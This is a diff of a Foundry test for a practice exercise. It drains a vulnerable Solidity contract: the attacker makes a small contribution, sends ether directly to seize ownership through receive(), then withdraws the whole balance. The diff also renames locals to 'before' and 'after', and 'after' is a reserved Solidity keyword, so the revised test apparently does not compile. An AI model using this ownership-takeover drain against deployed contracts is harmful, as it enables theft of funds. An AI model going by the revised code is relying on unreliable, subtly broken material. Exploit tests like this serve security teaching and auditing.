@@ -1,7 +1,10 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+// Foundry standard test utilities
 import "forge-std/Test.sol";
+
+// Import the vulnerable contract
 import "../src/Assignment11.sol";
 
 contract Assignment11ExploitTest is Test {
@@ -13,29 +16,34 @@ contract Assignment11ExploitTest is Test {
         vm.deal(attacker, 1 ether);
 
         target = new Assignment11();
-        vm.deal(address(target), 1 ether); // seed target with some funds
+
+        // fund the target contract to be drained
+        vm.deal(address(target), 1 ether);
     }
 
     function testExploit() public {
         vm.startPrank(attacker);
 
-        // Step 1: contribute with < 0.001 ether
+        // 1. Make a valid contribution
         target.contribute{value: 0.0005 ether}();
 
-        // Step 2: send ether directly to trigger receive()
+        // 2. Trigger receive() with direct ether send
         (bool success, ) = address(target).call{value: 0.0001 ether}("");
-        require(success, "direct send failed");
+        require(success, "Failed to send ether to fallback");
 
-        // Step 3: confirm ownership
-        assertEq(target.owner(), attacker, "ownership not transferred");
+        // 3. Ensure ownership was transferred
+        assertEq(target.owner(), attacker, "Ownership not transferred");
 
-        // Step 4: withdraw funds
-        uint256 attackerBalanceBefore = attacker.balance;
+        // 4. Withdraw the contract’s balance
+        uint256 before = attacker.balance;
         target.withdraw();
-        uint256 attackerBalanceAfter = attacker.balance;
+        uint256 after = attacker.balance;
 
-        assertGt(attackerBalanceAfter, attackerBalanceBefore, "funds not drained");
+        assertGt(after, before, "Funds were not drained");
 
         vm.stopPrank();
     }
+
+    // Receive function so the test contract can accept ether if needed
+    receive() external payable {}
 }
